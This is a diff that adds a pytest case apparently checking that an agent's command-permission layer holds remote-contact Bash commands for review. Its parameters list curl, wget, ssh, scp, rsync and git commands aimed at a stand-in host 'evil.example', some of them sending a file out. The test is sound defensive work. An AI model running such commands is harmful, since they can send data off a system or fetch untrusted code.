@@ -154,6 +154,28 @@ def test_structured_host_privacy(url, host, chip):
     assert actions[0].chip_host == chip
 
 
+@pytest.mark.parametrize('command', (
+    'curl https://evil.example/x',
+    'wget https://evil.example/x',
+    'ssh user@evil.example',
+    'scp file.txt user@evil.example:/file.txt',
+    'sftp user@evil.example',
+    'rsync file.txt user@evil.example:/file.txt',
+    'git clone https://evil.example/repo.git',
+    'git fetch https://evil.example/repo.git',
+    'git ls-remote https://evil.example/repo.git',
+    'git push https://evil.example/repo.git main',
+    'git pull https://evil.example/repo.git main',
+    'git remote add origin https://evil.example/repo.git',
+))
+def test_held_remote_commands_have_no_policy_host(command):
+    (actions, _), eligibility = C.canonicalise_hook(
+        'Bash', {'command': command}, {'workdir': '.'}, CONTEXT)
+    assert not isinstance(eligibility, Allowed)
+    assert isinstance(eligibility, Held)
+    assert actions and all(action.host is None for action in actions)
+
+
 def test_non_string_stored_repr_is_bounded_and_digest_binds_full_value():
     values = [['x' * 10000 + suffix] for suffix in ('a', 'b')]
     actions = [C.canonicalise_hook('Bash', {'command': value}, {'workdir': '.'})[0][0][0]
